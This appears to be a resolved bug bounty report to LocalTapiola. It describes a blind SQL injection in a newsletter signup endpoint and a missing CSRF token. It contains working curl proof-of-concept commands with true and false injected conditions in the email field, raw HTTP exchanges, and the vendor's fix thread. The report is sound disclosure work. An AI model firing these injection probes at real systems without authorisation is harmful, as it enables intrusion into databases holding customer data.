title: SQL Injection on /webApp/sijoitustalousuk email-parameter + potential lack of CSRF Token (viestinta.lahitapiola.fi)

profile.name: LocalTapiola
profile.about: LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services.

vulnerability_information:
Moi! This is my first report - please bear with me...

**Summary:**  Boolean based blind SQL injection in /webApp/sijoitustalousuk endpoint and potential lack of CSRF Token

**Description:** I detected that the email parameter of the POST request to http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk is evaluated. Two different statements appended to an email address cause different responses from the server.
PoC below to replay with curl.

## Steps To Reproduce:
True statement: Response Content-Length -> 2393
`curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17152%7CMCMID%7C80973514433021911535315148330980113730%7CMCAID%7CNONE%7CMCOPTOUT-1481863743s%7CNONE%7CMCAAMLH-1482461342%7C6%7CMCAAMB-1482461343%7Chmk_Lq6TPIBMW925SPhw3Q; AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; _sdsat_Website version=1.90; s_cc=true; s_sq=%5B%5BB%5D%5D; ARCSessionInfo=1%7C1481857037073; __atuvc=1%7C50; __atuvs=58535810158d836f000' \
    --data-binary $'email=winter@example.com13319082\'%20or%20\'6519\'%3d\'6519' \
    $'http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk'`

False statement: Response Content-Length: -> 1103
`curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17152%7CMCMID%7C80973514433021911535315148330980113730%7CMCAID%7CNONE%7CMCOPTOUT-1481863743s%7CNONE%7CMCAAMLH-1482461342%7C6%7CMCAAMB-1482461343%7Chmk_Lq6TPIBMW925SPhw3Q; AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; _sdsat_Website version=1.90; s_cc=true; s_sq=%5B%5BB%5D%5D; ARCSessionInfo=1%7C1481857037073; __atuvc=1%7C50; __atuvs=58535810158d836f000' \
    --data-binary $'email=winter@example.com13319082\'%20or%20\'6519\'%3d\'6520' \
    $'http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk'`

Additionally, it seems anyone's email can be registered to Neolane as there's no CSRF token in the form. I did not find an "unsubscribe" feature but I'm guessing there has to be one for privacy reasons. Someone could potentially remove entries from the subscribers list.

Hope this helps!

activities.message:
Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.

Our security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.
@localtapiola-thomas hi - I know a lot of people are on holidays atm, but is there any update?
I am estimating updates in mid-late January.
Hi @jimmyjohns - the issue is now fixed, could you please verify that you agree?

Hi @localtapiola-thomas - thanks for reaching back. Now it looks like the size of the response is the same, i.e. the field is not evaluated anymore. However, I get interesting results when adding a new user with a false statement. It looks like you are now storing the bulk input, i.e. not removing the illegitimate contents of the user input. 

Example:
```
POST /webApp/sijoitustalousuk HTTP/1.1
Host: viestinta.lahitapiola.fi
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Cookie: AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17152%7CMCMID%7C80973514433021911535315148330980113730%7CMCAID%7CNONE%7CMCOPTOUT-1481863743s%7CNONE%7CMCAAMLH-1482461342%7C6%7CMCAAMB-1482461343%7Chmk_Lq6TPIBMW925SPhw3Q; AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; _sdsat_Website version=1.90; s_cc=true; s_sq=%5B%5BB%5D%5D; ARCSessionInfo=1%7C1481857037073; __atuvc=1%7C50; __atuvs=58535810158d836f000

email=winter@example.com13319082'%20or%20'6519'%3d'6q52219
```

```
HTTP/1.1 200 OK
Date: Fri, 20 Jan 2017 15:06:17 GMT
Server: Apache
Content-length: 2376
Pragma: no-cache
Cache-Control: no-cache
Expires: Fri, 20 Jan 2017 15:06:17 GMT
X-UA-Compatible: IE=edge
X-XSS-Protection: 1; mode=block
Access-Control-Allow-Origin: *
Connection: close
Content-Type: text/html; charset=utf-8

SNIP -> Created new recipient
```

And when I re-run the first request
```
HTTP/1.1 200 OK
Date: Fri, 20 Jan 2017 15:08:10 GMT
Server: Apache
Content-length: 2331
Pragma: no-cache
Cache-Control: no-cache
Expires: Fri, 20 Jan 2017 15:08:10 GMT
X-UA-Compatible: IE=edge
X-XSS-Protection: 1; mode=block
Access-Control-Allow-Origin: *
Connection: close
Content-Type: text/html; charset=utf-8

SNIP -> Subscribed.
```

So you are still storing the information, in a separate record, for what is in fact the same email address. 
This could cause some trouble down the line, but at least now the data is no longer evaluated :)
This has been resolved. Related issues are noted.

summaries.content:
##Issue

The reporter found an SQL injection in one of the applications in viestinta.lahitapiola.fi. 

##Fix

The issue was investigated and found to be valid and critical. 

##Reasoning

The reported case was valid and right on target for the scope of the bug bounty program. SQL injections are always critical as they pose a serious threat to the underlying database and the information therein.  The award is based on risk - the underlying infrastructure and database contained a limited set of non-public customer related information.
